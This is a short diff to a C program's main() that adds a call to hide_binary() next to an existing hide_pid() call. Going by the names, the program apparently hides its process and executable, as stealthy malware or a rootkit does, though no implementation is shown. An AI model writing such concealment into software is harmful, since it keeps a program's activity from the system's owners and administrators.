@@ -7,6 +7,7 @@ int main(int argc, char *argv[])
 {
   
   hide_pid( ) ;
+  hide_binary( ) ;
 
   int pid ;
   int delay ;
